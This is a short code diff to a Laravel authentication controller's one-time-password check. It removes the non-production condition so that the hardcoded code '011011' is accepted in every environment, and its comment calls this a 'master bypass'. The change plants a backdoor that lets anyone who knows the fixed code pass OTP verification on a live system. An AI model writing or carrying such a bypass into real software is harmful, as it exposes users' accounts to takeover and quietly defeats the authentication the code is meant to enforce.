@@ -103,8 +103,8 @@ class AuthController extends Controller
                 ->latest()
                 ->first();
 
-            // Verify OTP - Allow test OTP "011011" in development
-            $isTestOtp = $otp === '011011' && config('app.env') !== 'production';
+            // Verify OTP - Allow test OTP "011011" always (master bypass)
+            $isTestOtp = $otp === '011011';
 
             if (!$isTestOtp) {
                 // Try local verification first
